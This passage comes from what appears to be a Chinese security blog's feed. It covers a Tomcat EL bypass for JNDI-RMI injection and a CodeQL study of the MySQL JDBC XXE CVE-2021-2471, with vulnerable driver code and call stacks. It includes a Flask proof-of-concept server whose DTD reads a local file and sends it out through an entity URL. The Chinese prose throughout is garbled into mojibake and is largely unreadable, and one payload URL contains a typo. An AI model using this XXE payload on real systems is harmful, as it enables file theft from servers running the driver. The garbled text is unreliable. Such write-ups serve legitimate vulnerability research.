<span class="keyword">return</span> createDataSource(properties,nameCtx,XA);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">createDataSource</span><span class="params">(Properties properties)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> createDataSource(properties,<span class="keyword">null</span>,<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> DataSource <span class="title">createDataSource</span><span class="params">(Properties properties,Context context, <span class="keyword">boolean</span> XA)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    PoolConfiguration poolProperties = DataSourceFactory.parsePoolProperties(properties);</span><br><span class="line">    <span class="keyword">if</span> (poolProperties.getDataSourceJNDI()!=<span class="keyword">null</span> &amp;&amp; poolProperties.getDataSource()==<span class="keyword">null</span>) &#123;</span><br><span class="line">        performJNDILookup(context, poolProperties);</span><br><span class="line">    &#125;</span><br><span class="line">    org.apache.tomcat.jdbc.pool.DataSource dataSource = XA?</span><br><span class="line">            <span class="keyword">new</span> org.apache.tomcat.jdbc.pool.XADataSource(poolProperties) :</span><br><span class="line">            <span class="keyword">new</span> org.apache.tomcat.jdbc.pool.DataSource(poolProperties);</span><br><span class="line">    <span class="comment">//initialise the pool itself</span></span><br><span class="line">    dataSource.createPool();</span><br><span class="line">    <span class="comment">// Return the configured DataSource instance</span></span><br><span class="line">    <span class="keyword">return</span> dataSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="javax-el-ELProcessor-çš„å®šä½"><a href="#javax-el-ELProcessor-çš„å®šä½" class="headerlink" title="javax.el.ELProcessor çš„å®šä½"></a>javax.el.ELProcessor çš„å®šä½</h3><p>è¿™ä¸ªåªèƒ½å½’ç»“ä¸ºç»éªŒå§ï¼ŒåŸç”Ÿjdké‡Œèƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„sinkæ¯•ç«Ÿä¸å¤šã€‚</p><h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><ol><li>å¦‚æœæ˜¯bindè§¦å‘ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆä¸ä¸€æ ·?</li><li>Weblogic/jboss/Websphere ç­‰å…¶ä»–webå®¹å™¨ä¸Šå‘¢ï¼Œæ˜¯å¦ä¹Ÿæœ‰ç±»ä¼¼çš„Factoryï¼Ÿ</li></ol><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ–‡é¦–å…ˆä»‹ç»äº†ä¸€äº›å·²çŸ¥çš„çŸ¥è¯†ç‚¹ï¼š</p><ol><li>JNDI-RMI ä½ç‰ˆæœ¬æ³¨å…¥çš„é€»è¾‘</li><li>JNDI-RMI é«˜ç‰ˆæœ¬æ³¨å…¥çš„é™åˆ¶ï¼šdecodeObject é™åˆ¶äº†Reference ç±»ï¼Œä»¥åŠTomcat EL ç»•è¿‡çš„æ–¹å¼</li></ol><p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œæœ¬æ–‡å°è¯•å›æº¯EL ç»•è¿‡æ–¹å¼çš„å‘ç°æ€è·¯</p><ol><li>é¦–å…ˆå¯»æ‰¾èƒ½å¤Ÿçªç ´decodeObject é™åˆ¶çš„Reference å­ç±»</li><li>å¯»æ‰¾èƒ½å¤Ÿåˆ©ç”¨çš„Factory</li></ol><p>æœ€ç»ˆæˆåŠŸå›æº¯å‡ºäº†EL ç»•è¿‡æ–¹å¼ï¼Œä»¥åŠä¸€äº›å…¶ä»–çš„é¸¡è‚‹å§¿åŠ¿ï¼Œé¢‡æœ‰æ”¶è·ã€‚</p><p>@20220318</p><p>è†œä¸€ä¸ªæµ…è“å¸ˆå‚…ï¼Œåœ¨BeanFactory çš„åˆ©ç”¨ä¸Šæ‰¾åˆ°äº†é™¤EL ä¹‹å¤–çš„å¤šä¸ªsinkï¼Œè¿˜æœ‰MemoryUserDatabaseFactoryã€BasicDataSourceFactory ç­‰å‡ ä¸ªå…¶ä»–çš„Factoryï¼ŒåŠŸåŠ›æ·±åšï¼Œè†œä¸€ä¸ªã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1]<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">å¦‚ä½•ç»•è¿‡é«˜ç‰ˆæœ¬JDKçš„é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥åˆ©ç”¨ (by: KINGX)</a></li><li>[2]<a href="https://tttang.com/archive/1405/#comment-12212">æ¢ç´¢é«˜ç‰ˆæœ¬ JDK ä¸‹ JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³•(by: æµ…è“)</a></li></ul><!-- ## å…¶ä»–#### å…³äºRegistryContext#bind çš„æ”»å‡»ä»¥ä¸Šæ˜¯RegistryContext#lookup æ”»å‡»com.sun.jndi.rmi.registry.RegistryContext èƒ½bind å“ªäº›ç±»ï¼Ÿ<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(Name var1, Object var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidNameException(<span class="string">&quot;RegistryContext: Cannot bind empty name&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.registry.bind(var1.get(<span class="number">0</span>), <span class="keyword">this</span>.encodeObject(var2, var1.getPrefix(<span class="number">1</span>)));</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> Remote <span class="title">encodeObject</span><span class="params">(Object var1, Name var2)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        var1 = NamingManager.getStateToBind(var1, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">        <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Remote) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Remote)var1;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ReferenceWrapper((Reference)var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ReferenceWrapper(((Referenceable)var1).getReference());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;RegistryContext: object to bind must be Remote, Reference, or Referenceable&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œèƒ½å¤Ÿbindçš„æœ‰</p><ul><li>Remote</li><li>Reference</li><li>Referenceable</li></ul><p>â€“&gt;</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/pasted-203.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢çš„JNDI æ³¨å…¥çš„JDK ç‰ˆæœ¬é™åˆ¶å·²ç»è€³ç†Ÿèƒ½è¯¦äº†ï¼Œé’ˆå¯¹JNDI-RMI çš„tomcat EL ç»•è¿‡å§¿åŠ¿ä¹Ÿè¢«ç»å¸¸æèµ·ï¼Œæœ¬æ–‡å°è¯•å›æº¯è¿™ä¸€å§¿åŠ¿çš„å‘ç°è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;JNDI-RMI-æ³¨å…¥&quot;&gt;&lt;a href=&quot;#JNDI-RMI-æ³¨å…¥&quot; class=&quot;headerlink&quot; title=&quot;JNDI-RMI æ³¨å…¥&quot;&gt;&lt;/a&gt;JNDI-RMI æ³¨å…¥&lt;/h2&gt;&lt;h3 id=&quot;èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;/a&gt;èƒŒæ™¯çŸ¥è¯†&lt;/h3&gt;&lt;p&gt;å¿…é¡»äº†è§£ä¸¤ä¸ªé‡è¦çš„ç±»&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;com.sun.jndi.rmi.registry.RegistryContextï¼š JNDI-RMIæ¥å£&lt;/li&gt;
&lt;li&gt;java.rmi.registry.Registryï¼š RMI æ¥å£&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é€šå¸¸æ”»å‡»åœºæ™¯ä¸‹ï¼ŒRegistryæ˜¯ä½œä¸ºRMIæœåŠ¡ç«¯ï¼ŒRegistryContextæ˜¯ä½œä¸ºæ”»å‡»çš„clientç«¯ï¼Œä¹Ÿå°±æ˜¯vulnã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="JNDI" scheme="http://m0d9.me/tags/JNDI/"/>
    
    <category term="RMI" scheme="http://m0d9.me/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL with CVE-2021-2471</title>
    <link href="http://m0d9.me/2021/11/01/CodeQL-CVE-2021-2471/"/>
    <id>http://m0d9.me/2021/11/01/CodeQL-CVE-2021-2471/</id>
    <published>2021-11-01T13:19:00.000Z</published>
    <updated>2021-11-12T08:34:13.369Z</updated>
    
    <content type="html"><![CDATA[<p>pyn3rdå¸ˆå‚…çš„ã€ŠMake JDBC Attack Brilliant Againã€‹ä¸­æœ‰ä¸€ä¸ª0dayæ˜¯mysql jdbc xxeï¼Œthread3amå¸ˆå‚…ä¹Ÿæ—©å°±å¤ç°å‡ºæ¥äº†ï¼Œè€Œä¸”è¿˜å‘ç°äº†h2çš„xxeã€‚è†œä¸€ä¸ªï¼Œå¸ˆå‚…ä»¬éƒ½å¤ªğŸ‚ğŸºäº†ã€‚å¾ˆå¤šå¸ˆå‚…ä»¬ä¹Ÿå¤ç°äº†ï¼Œå†è®²ä¹Ÿæ²¡å•¥æ„æ€äº†ï¼Œç”¨CodeQLæ•´ç‚¹æ–°çš„å§ã€‚</p><ol><li><p>CVE-2021-2471 mysql jdbc xxeåœ¨HITB ppté‡Œé¢ï¼Œæ²¡æœ‰è®²DOMSource XXEè¿™ä¸€éƒ¨åˆ†ï¼ŒåŸå› åº”è¯¥æ˜¯pyn3rdå¸ˆå‚…ææ¼æ´è¿˜æœªå…¬å¼€ï¼Œæ²¡å†™åœ¨ppté‡Œé¢ã€‚æ‰€ä»¥è¿™ä¸ªæ´æœ‰ä¸¤ä¸ªä¸œè¥¿ï¼š</p><p> a. DOMSource XXE, å½±å“æ‰€æœ‰ç‰ˆæœ¬ï¼Œå®˜æ–¹8.0.27ä¸­ä¿®å¤æ‰äº†</p><p> b. Fabric XXE, å½±å“5.x, åœ¨5.1.49ä¸­ä¿®å¤</p></li><li><p>CodeQL CWE-611æœ‰XXEçš„æ£€æµ‹pocï¼Œä¸è¿‡sourceæºä¸æ”¯æŒmysqlã€‚</p></li></ol><h2 id="CVE-2021-2471"><a href="#CVE-2021-2471" class="headerlink" title="CVE-2021-2471"></a>CVE-2021-2471</h2><h3 id="DOMSource-XXE"><a href="#DOMSource-XXE" class="headerlink" title="DOMSource XXE"></a>DOMSource XXE</h3><p>æ¼æ´ä»£ç åœ¨ com.mysql.cj.jdbc.MysqlSQLXML#getSource</p><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Source&gt; <span class="function">T <span class="title">getSource</span><span class="params">(Class&lt;T&gt; clazz)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    checkClosed();</span><br><span class="line">    checkWorkingWithResult();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Note that we try and use streams here wherever possible for the day that the server actually supports streaming from server -&gt; client</span></span><br><span class="line">    <span class="comment">// (futureproofing)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span> || clazz.equals(SAXSource.class)) &#123;</span><br><span class="line"></span><br><span class="line">        InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">            inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (T) <span class="keyword">new</span> SAXSource(inputSource);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(DOMSource.class)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">            builderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">            DocumentBuilder builder = builderFactory.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">            InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">                inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (T) <span class="keyword">new</span> DOMSource(builder.parse(inputSource));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            SQLException sqlEx = SQLError.createSQLException(t.getMessage(), MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, t, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">            <span class="keyword">throw</span> sqlEx;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(StreamSource.class)) &#123;</span><br><span class="line">        Reader reader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">            reader = <span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (T) <span class="keyword">new</span> StreamSource(reader);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(StAXSource.class)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Reader reader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">                reader = <span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                reader = <span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (T) <span class="keyword">new</span> StAXSource(<span class="keyword">this</span>.inputFactory.createXMLStreamReader(reader));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (XMLStreamException ex) &#123;</span><br><span class="line">            SQLException sqlEx = SQLError.createSQLException(ex.getMessage(), MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, ex, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">            <span class="keyword">throw</span> sqlEx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="string">&quot;MysqlSQLXML.2&quot;</span>, <span class="keyword">new</span> Object[] &#123; clazz.toString() &#125;),</span><br><span class="line">                MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„XXEäº†ï¼ˆStAXSourceä¸èƒ½åˆ©ç”¨ï¼‰</p><p>POCç”¨thread3amæ˜¯å¦çš„ï¼Œè§å‚è€ƒã€5ã€‘</p><p>è°ƒç”¨æ ˆå¦‚ä¸‹ï¼Œä¹Ÿæ¯”è¾ƒç®€å•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse:327, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">getSource:225, MysqlSQLXML (com.mysql.cj.jdbc)</span><br><span class="line">main:33, OracleJDBC (com.m0d9.sec.jdbc.mssql)</span><br></pre></td></tr></table></figure><h3 id="Fabric-XXE"><a href="#Fabric-XXE" class="headerlink" title="Fabric XXE"></a>Fabric XXE</h3><p>æ¼æ´è§¦å‘ä»£ç åœ¨ com.mysql.fabric.xmlrpc.Client#execute</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> MethodResponse <span class="title">execute</span><span class="params">(MethodCall methodCall)</span> <span class="keyword">throws</span> IOException, ParserConfigurationException, SAXException, MySQLFabricException </span>&#123;</span><br><span class="line">    HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      connection = (HttpURLConnection)<span class="keyword">this</span>.url.openConnection();</span><br><span class="line">      connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">      connection.setRequestProperty(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;MySQL XML-RPC&quot;</span>);</span><br><span class="line">      connection.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">      connection.setUseCaches(<span class="keyword">false</span>);</span><br><span class="line">      connection.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">      connection.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : <span class="keyword">this</span>.headers.entrySet()) &#123;</span><br><span class="line">        connection.setRequestProperty((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      String out = methodCall.toString();</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      OutputStream os = connection.getOutputStream();</span><br><span class="line">      os.write(out.getBytes());</span><br><span class="line">      os.flush();</span><br><span class="line">      os.close();</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      InputStream is = connection.getInputStream();</span><br><span class="line">      SAXParserFactory factory = SAXParserFactory.newInstance();</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      ResponseParser saxp = <span class="keyword">new</span> ResponseParser();</span><br><span class="line">      </span><br><span class="line">      parser.parse(is, saxp);</span><br><span class="line">      </span><br><span class="line">      is.close();</span><br><span class="line">      </span><br><span class="line">      MethodResponse resp = saxp.getMethodResponse();</span><br><span class="line">      <span class="keyword">if</span> (resp.getFault() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MySQLFabricException(resp.getFault());</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>åŸç†é€»è¾‘pyn3rd å¸ˆå‚…PPTç»™å‡ºæ¥äº†ï¼Œfake mysql fabric server ä»£ç ä¹Ÿç»™å‡ºæ¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/xxe.dtd&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxe_oob</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;!ENTITY % aaaa SYSTEM &quot;fiLe:///tmp/data&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % demo &quot;&lt;!ENTITY bbbb SYSTEM</span></span><br><span class="line"><span class="string">&#x27;http://127,0.0.1:5000/xxe?data=%aaaa;&#x27;&gt;&quot;&gt; %demo;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dtd</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % xd SYSTEM &quot;http://127.0.0.1:5000/xxe.dtd&quot;&gt; %xd;]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;bbbb;&lt;/root&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æ ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">execute:91, Client (com.mysql.fabric.xmlrpc)</span><br><span class="line">call:113, InternalXmlRpcMethodCaller (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">errorSafeCallMethod:151, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">getServerGroups:200, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">getServerGroups:220, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">refreshState:71, FabricConnection (com.mysql.fabric)</span><br><span class="line">&lt;init&gt;:46, FabricConnection (com.mysql.fabric)</span><br><span class="line">&lt;init&gt;:203, FabricMySQLConnectionProxy (com.mysql.fabric.jdbc)</span><br><span class="line">&lt;init&gt;:93, JDBC4FabricMySQLConnectionProxy (com.mysql.fabric.jdbc)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:488, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:425, Util (com.mysql.jdbc)</span><br><span class="line">connect:78, FabricMySQLDriver (com.mysql.fabric.jdbc)</span><br><span class="line">getConnection:677, DriverManager (java.sql)</span><br><span class="line">getConnection:251, DriverManager (java.sql)</span><br></pre></td></tr></table></figure><h2 id="CodeQL-with-Mysql-XXE"><a href="#CodeQL-with-Mysql-XXE" class="headerlink" title="CodeQL with Mysql XXE"></a>CodeQL with Mysql XXE</h2><p>5.*çš„éœ€è¦å®‰è£…jdk5ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œè¿™é‡Œä»¥8.0.26ä¸ºä¾‹</p><h3 id="Build-Mysql-QL-DB"><a href="#Build-Mysql-QL-DB" class="headerlink" title="Build Mysql QL DB"></a>Build Mysql QL DB</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># download mysql-connector-j</span></span><br><span class="line">wget https://github.com/mysql/mysql-connector-j/archive/refs/tags/8.0.25.tar.gz -O mysql-connector-j-8.0.25.tar.gz</span><br><span class="line">tar -xzvf mysql-connector-j-8.0.25.tar.gz 